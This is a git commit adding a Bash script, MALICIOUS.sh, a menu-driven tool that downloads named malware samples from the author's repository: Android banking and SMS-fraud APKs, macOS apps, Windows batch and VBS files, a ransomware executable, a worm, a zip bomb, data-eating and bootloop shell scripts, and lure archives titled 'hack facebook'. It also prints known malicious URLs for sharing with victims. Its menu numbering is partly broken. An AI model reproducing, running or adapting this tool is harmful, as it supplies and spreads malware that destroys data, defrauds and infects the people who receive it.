e74375b1b67b322b4791fc6c5a8422ad331be654
Alienrazor <99122855+Alienrazor@users.noreply.github.com>
2022-10-22 00:59:11 +0500

    Add files via upload

---
+++ MALICIOUS.sh
@@ -0,0 +1,805 @@
+#\bin\bash
+#MALICIOUS 
+#CODED ALIENRAZOR 
+red="\e[91m"
+rset="\e[0m"
+grn="\e[92m"
+ylo="\e[93m"
+blue="\e[94m"
+cyan="\e[96m"
+pink="\e[95m"
+#-----------------
+# scripting start
+
+mainb(){
+clear
+echo -e '\e[93m               
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡖⠁⠀⠀⠀⠀⠀⠀⠈⢲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⢀⣀⣤⣤⣤⣤⣀⡀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣔⢿⡿⠟⠛⠛⠻⢿⡿⣢⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣷⣤⣀⡀⢀⣀⣤⣾⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⡿⠿⠿⠿⣿⣿⣿⣿⡿⠏⠻⢿⣿⣿⣿⣿⠿⠿⠿⢿⣿⣷⡀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⠁⠀⠀⢸⣿⡇⠉⠻⣿⠇⠀⠀⠸⣿⡿⠋⢰⣿⡇⠀⠀⠈⠙⢿⡄⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⠁⠀⠀⠀⠀⠘⣿⣷⡀⠀⠰⣿⣶⣶⣿⡎⠀⢀⣾⣿⠇⠀⠀⠀⠀⠈⢿⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠹⣿⣷⣄⠀⣿⣿⣿⣿⠀⣠⣾⣿⠏⠀⠀⠀⠀⠀⠀⢸⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⢇⣿⣿⣿⣿⡸⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠈⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣀⣀⢀⣀⣠⣴⣿⣿⠿⠋⠙⠿⣿⣿⣦⣄⣀⠀⠀⣀⡠⠂⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠛⠉⠀⠀⠀⠀⠀⠈⠉⠛⠛⠛⠛⠋⠁⠀⠀⠀⠀⠀        
+
+                    ALIENRAZOR 
+'
+echo " " 
+echo " "
+echo " "
+}
+
+
+
+
+
+
+
+
+
+menu(){
+clear
+mainb
+echo -e "$grn      ＞＞＞＞>>>＞$ylo [Options]$grn ＜<<<＜＜＜＜$rset"
+echo " "
+echo " "
+#############Main Menu############
+echo -e "$red    $cyan [\e[92m1\e[96m] Android" "          $cyan[\e[92m6\e[96m] Android [link]"
+echo -e "$red    $cyan [\e[92m2\e[96m] Macosx" "          $cyan [\e[92m7\e[96m] Macosx  [link]"
+echo -e "$red    $cyan [\e[92m3\e[96m] Windows " "        $cyan [\e[92m8\e[96m] Windows [link]"
+echo -e "$red    $cyan [\e[92m4\e[96m] Pdf Autorun PC " " $cyan [\e[92m9\e[96m] Worm PC and Bomb.zip"
+echo -e "$red    $cyan [\e[92m5\e[96m] Shell Virus" 
+echo " "
+echo -e "$red    $cyan [\e[92mU\e[96m] Update Tool"
+echo -e "$red    $cyan [\e[92mA\e[96m] About Tool & Owner"
+echo -e "$red    $cyan [\e[92m0\e[96m] Exit"
+echo " "
+echo " "
+echo -e "$grn        >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
+echo " "
+echo -ne "\e[92m#SELECT OPTION\e[92m: "
+read optnz
+if [ $optnz = "1" ];
+then
+VAndroid
+elif [ $optnz = "2" ];
+then
+VMacosx
+elif [ $optnz = "3" ];
+then
+AboutWindows
+elif [ $optnz = "4" ];
+then
+Pdf
+elif [ $optnz = "5" ];
+then
+Shellvirus
+mainb
+menu
+elif [ $optnz = "6" ];
+then
+Vandroidlink
+mainb
+menu
+elif [ $optnz = "7" ];
+then
+Vmacosxlink
+mainb
+menu
+elif [ $optnz = "8" ];
+then
+Vpclink 
+mainb
+menu
+elif [ $optnz = "9" ];
+then
+VWorm
+mainb
+menu
+elif [ $optnz = "U" ];
+then
+Updates
+mainb
+menu
+elif [ $optnz = "A" ];
+then
+Pop
+mainb
+menu
+elif [ $optnz = "12" ];
+then
+exit 1
+mainb
+menu
+else
+echo "wrong"
+exit
+fi
+}
+VAndroid(){
+clear
+mainb
+echo  -e "$red Select Your Malicious Apk" 
+
+
+echo  -e "   $cyan [\e[92m1\e[96m] Agent "  "             $cyan [\e[92m20\e[96m] Badnews "
+echo  -e  "   $cyan [\e[92m2\e[96m] Bios " "              $cyan [\e[92m21\e[96m] BlatanSMS " 
+echo  -e "   $cyan [\e[92m3\e[96m] BrainTest " "         $cyan [\e[92m22\e[96m] Claco " 
+echo  -e "   $cyan [\e[92m4\e[96m] DropDialer " "        $cyan [\e[92m23\e[96m] FakeBank " 
+echo  -e "   $cyan [\e[92m5\e[96m] FakeCMCC " "          $cyan [\e[92m24\e[96m] FakeDoc "
+echo  -e  "   $cyan [\e[92m6\e[96m] FakeValidation " "    $cyan [\e[92m25\e[96m] Fobus " 
+echo  -e "   $cyan [\e[92m7\e[96m] GinMaster " "         $cyan [\e[92m26\e[96m] Masnu "
+echo  -e  "   $cyan [\e[92m8\e[96m] Elite " "             $cyan [\e[92m27\e[96m] Omigo "
+echo  -e  "   $cyan [\e[92m9\e[96m] Opfake " "            $cyan [\e[92m28\e[96m] SmsWorker " 
+echo  -e "   $cyan [\e[92m10\e[96m] Vietcon " "          $cyan [\e[92m29\e[96m] Candycorn "
+echo  -e  "   $cyan [\e[92m11\e[96m] Cat " "              $cyan [\e[92m30\e[96m] Chistescortos "
+echo  -e  "   $cyan [\e[92m12\e[96m] Chistespicanticos " "$cyan [\e[92m31\e[96m] ComFunnys " 
+echo  -e "   $cyan [\e[92m13\e[96m] ComImagePets " "     $cyan [\e[92m32\e[96m] ComKitchen "
+echo  -e  "   $cyan [\e[92m14\e[96m] ComLaughtter " "     $cyan [\e[92m33\e[96m] Prasesamor "
+echo  -e   "   $cyan [\e[92m15\e[96m] Prasesfee " "        $cyan [\e[92m34\e[96m] RecipeSmart " 
+echo  -e  "   $cyan [\e[92m16\e[96m] Romaticpos " "       $cyan [\e[92m35\e[96m] Statetss "
+echo  -e  "   $cyan [\e[92m17\e[96m] Thinkking " "        $cyan [\e[92m36\e[96m] Crd "
+echo  -e  "   $cyan [\e[92m18\e[96m] Dendroid " "         $cyan [\e[92m37\e[96m] Ds " 
+echo  -e "   $cyan [\e[92m19\e[96m] Facebook " "         $cyan [\e[92m38\e[96m] Fakeav " 
+echo " "
+echo  -e "   $cyan [\e[92m0\e[96m]  [BACK TO MAIN]" 
+echo " "
+echo " "
+echo -e "$grn      >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
+echo " "
+echo -ne "\e[92m  SELECT OPTION\e[92m: "
+read ope
+if [ $ope = "1" ];
+then
+wget -q -q https://github.com/Alienrazor/N-M/blob/main/A-V/Agent.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "2" ];
+then 
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/BadNews.A.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "3" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/BrainTest.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "4" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/Dropdialer.apk 
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "5" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/FakeCMCC.A.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "6" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/FakeValidation.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "7" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/GinMaster.Z.AdvancedObfuscation.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "8" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/Minecraft2.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "9" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/Opfake.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "10" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/Vietcon.apk 
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "11" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/cat.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "12" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/chistespicanticos.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "13" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/com.imagepets.apk #######
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "14" ]; 
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/com.laughtter.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "15" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/com.prasesfee.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "16" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/com.romaticpos.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "17" ];
+then
+wget -q  https://github.com/Alienrazor/N-M/blob/main/A-V/com.thinkking.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "18" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/dendroid.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "19" ];
+then
+wget -q  https://github.com/Alienrazor/N-M/blob/main/A-V/facebook.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "20" ];
+then 
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/BadNews.A.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "21" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/Blatantsms.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "22" ];
+then
+wget -q  https://github.com/Alienrazor/N-M/blob/main/A-V/Claco.A.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "23" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/FakeBank.B.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "24" ]; 
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/FakeDoc.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "25" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/Fobus.apk	   
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "26" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/Masnu.apk	   
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "27" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/Omigo.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "28" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/SmsWorker.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "29" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/candy_corn.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "30" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/chistescortos.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "31" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/com.funnyys.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "32" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/com.kitchenn.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "33" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/com.prasesamor.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "34" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/com.recipesmart.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "35" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/com.statetss.apk	         
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "36" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/crd.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "37" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/ds.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "38" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/Fake_av.apk
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "39" ];
+then
+wget -q 
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "39" ];
+then
+wget -q
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $ope = "0" ];
+then
+mainb
+menu
+else
+echo "wrong"
+exit
+fi
+}
+VMacosx(){
+clear
+mainb
+echo " "
+echo -e "$red       $cyan [\e[92m1\e[96m] Trinoids"
+echo -e "$red       $cyan [\e[92m2\e[96m] Nothing"
+echo -e "$red       $cyan [\e[92m0\e[96m] Back"
+echo " "
+echo " "
+echo -e "$grn       >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
+echo " "
+echo -ne "\e[92m#SELECT OPTION\e[92m: "
+read maco
+if [ $maco = "1" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/trinoids.app
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $maco = "2" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/nothing.app
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $maco = "0" ];
+then
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+else
+echo "wrong"
+exit
+fi
+}
+####################Done Macosx	
+###################Start PC
+AboutWindows(){
+clear
+mainb
+echo -e "$red   $cyan [\e[92m1\e[96m] Ugly.bat" "           $cyan [\e[92m6\e[96m] Sleepy.bat"
+echo -e "$red   $cyan [\e[92m2\e[96m] Reg-eater.bat" "      $cyan [\e[92m7\e[96m] Kuis.bat"
+echo -e "$red   $cyan [\e[92m3\e[96m] Koce.bat" "           $cyan [\e[92m8\e[96m] Cmd.bat"
+echo -e "$red   $cyan [\e[92m4\e[96m] Capslock.vbs" "       $cyan [\e[92m9\e[96m] Alay.vbs"
+echo -e "$red   $cyan [\e[92m5\e[96m] RansomewareFileDecryptor.exe" 
+echo -e "   $cyan [\e[92m10\e[96m] RIP.bat"
+echo " "
+echo -e "   $cyan [\e[92m0\e[96m] Back"
+echo " "
+echo " "
+echo -e "$grn      >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
+echo " "
+echo -ne "\e[92m#SELECT OPTION\e[92m: "
+read vpc
+if [ $vpc = "1" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/ugly.bat
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $vpc = "2" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/sleepy.bat
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $vpc = "3" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/reg-eater.bat
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $vpc = "4" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/kuis.bat
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $vpc = "5" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/koce.bat
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $vpc = "6" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/cmd.bat
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $vpc = "7" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/capslock.vbs
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $vpc = "8" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/alay.vbs
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $vpc = "9" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/ransomeware.exe
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $vpc = "10" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/RIP.bat
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $vpc = "0" ];
+then
+mainb
+menu
+else
+echo "wrong"
+exit
+fi
+}
+
+#######################Done  PC
+#################start PDF
+Pdf(){
+clear
+mainb
+echo -e "$red   $cyan [\e[92m8\e[96m] How to hack facebook (extension: rar)"
+echo -e "$red   $cyan [\e[92m8\e[96m] Hack facebook (extension: rar) "
+echo " "
+echo -e "   $cyan [\e[92m0\e[96m] Back"
+echo " "
+echo " "
+echo -e "$grn      >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
+echo " "
+echo -ne "\e[92m#SELECT OPTION\e[92m: "
+read pdf
+if [ $pdf = "1" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/howtohackfb.rar
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $pdf = "2" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/hackfacebook.rar
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $pdf = "0" ];
+then
+mainb
+menu
+else
+echo "wrong"
+exit
+fi
+}
+
+
+######################Done pdf
+		
+#####################start link
+Vpclink(){
+clear
+mainb
+echo " "
+echo -e "$grn        Copy link the below"
+echo " "
+echo -e "$red          http://gumblar.cn"
+echo -e "$red          http://Hurr-Durr.com"
+echo -e "$red          http://youareaidoit.org"
+echo -e "$red          http://youareanidiot.org "
+echo -e "$red          http://V-I-R-U-S.com"
+echo -e "$red          http://38zu.cn"
+echo " "
+echo " "
+echo -e "     $cyan [\e[92m0\e[96m] Back"
+echo " "
+echo " "
+echo -e "$grn      >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
+echo " "
+echo " "
+echo -ne "\e[92m#SELECT OPTION\e[92m: "
+read bak
+if [ $bak = "0" ];
+then
+mainb
+menu
+else
+echo "wrong"
+exit
+fi
+}
+
+
+
+Vmacosxlink(){
+clear
+mainb
+echo -e "$grn          Copy link the below"
+echo " "
+echo -e "$red          http://bit.ly/2DFak"
+echo " "
+echo -e "   $cyan [\e[92m0\e[96m] Back"
+echo " "
+echo " "
+echo -e "$grn      >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
+echo " "
+echo " "
+echo -ne "\e[92m#SELECT OPTION\e[92m: "
+read bak
+if [ $bak = "0" ];
+then
+mainb
+menu
+else
+echo "wrong"
+exit
+fi
+}
+
+
+Vandroidlink(){
+clear
+mainb
+echo -e "$grn          Copy link the below"
+echo " "
+echo -e "$red           http://url7.me/NwVk1"
+echo " "
+echo -e "  $cyan [\e[92m0\e[96m] Back"
+echo " "
+echo " "
+echo -e "$grn      >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
+echo " "
+echo -ne "\e[92m#SELECT OPTION\e[92m: "
+read bak
+if [ $bak = "0" ];
+then
+mainb
+menu
+else
+echo "wrong"
+exit
+fi
+}
+
+########################Done link
+
+############Worm and Bomb zip
+VWorm(){
+clear
+mainb
+echo -e "$red        $cyan [\e[92m1\e[96m] Worm.bat"
+echo -e "$red        $cyan [\e[92m2\e[96m] Bomb.zip"
+echo " "
+echo -e "        $cyan [\e[92m3\e[96m] Back"
+echo " "
+echo " "
+echo -e "$grn      >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
+echo " "
+echo -ne "\e[92m#SELECT OPTION\e[92m: "
+read wor
+if [ $wor = "1" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/worm.bat
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $wor = "2" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/bom-zip.zip
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+elif [ $wor = "0" ];
+then
+echo " "
+echo " DOWNLOADED ^_^ "
+exit
+else
+echo "wrong"
+exit
+fi
+}
+
+
+
+		
+###############Start Shell Virus		
+Shellvirus(){
+clear
+mainb
+echo -e "         $cyan [\e[92m1\e[96m] Data-Eater.sh"
+echo -e "$red      $cyan [\e[92m2\e[96m] Bootloop.sh"
+echo " "
+echo -e "         $cyan [\e[92m3\e[96m] Back"
+echo " "
+echo " "
+echo -e "$grn      >＞＞＞＞＞$ylo [SELECT]$grn ＜＜＜＜＜<$rset"
+echo " "
+echo -ne "\e[92m#SELECT OPTION\e[92m: "
+read she
+if [ $she = "1" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/data-eater.sh
+echo " "
+echo " DOWNLOADED ^_^ "
+exit 
+elif [ $she = "2" ];
+then
+wget -q https://github.com/Alienrazor/N-M/blob/main/A-V/bootloop.sh
+echo " "
+echo " DOWNLOADED ^_^ "
+exit 
+elif [ $she = "3" ];
+then
+mainb
+menu
+else
+echo "wrong"
+exit
+fi
+}
+
+
+
+######done
+Updates(){
+clear
+mainb
+if [ -d "$HOME/Malicious" ];
+then
+cd $HOME
+rm -rf Malicious
+elif [ -d "$HOME/Malicious" ];
+then
+cd $HOME
+rm -rf Malicious
+else
+echo
+exit 1
+fi
+cd $HOME
+sleep 1
+echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
+echo
+printf "                     \e[96m["
+# While process is running...
+while git clone https://github.com/Alienrazor/Malicious 2> /dev/null; do 
+    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
+    sleep 1
+done
+printf "\e[96m]\e[0m"
+echo
+echo
+echo
+printf "\e[96m       UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"
+sleep 2.0
+cd $HOME
+cd Malicious
+bash Malicious.sh
+}
+
+
+Pop(){
+clear
+mainb
+echo -e '\e[96m               
+        ╔═══════════════════════════════════╗\e[0m
+ \e[96m       ║  \e[93mHI, I M ALIENRAZOR TOOL OWNER.\e[96m   ║\e[0m
+ \e[96m       ║       FOLLOW ME ON GITHUB   \e[96m      ║\e[0m
+ \e[96m       ║   \e[91m         MALICIOUS             \e[96m ║\e[0m
+ \e[96m       ║       ANDROID, WINDOWS, MAC      \e[96m ║\e[0m
+ \e[96m       ║      APP, LINKS, EVERYTHING      \e[96m ║\e[0m
+ \e[96m       ║        \e[91m  ❌DISCLAIMER❌ \e[96m    \e[96m      ║\e[0m
+ \e[96m       ║           IN ANY CASE            \e[96m ║\e[0m
+ \e[96m       ║      I M NOT RESPONSIBLE FOR      \e[96m║\e[0m
+ \e[96m       ║   ANY SOFTWARE HARDWARE DAMAGE    \e[96m║\e[0m
+ \e[96m       ║         Select \e[91mE\e[96m to MAIN\e[96m          ║\e[0m
+ \e[96m       ╚═══════════════════════════════════╝\e[0m
+'
+echo -en "\e[32mSELECT OPTION [\E[91mE\e[32m]: \e[0m "
+read p
+if [ "$p" = "E" ];
+then
+menu
+else
+mainb
+menu
+exit
+fi
+}
+mainb
+menu
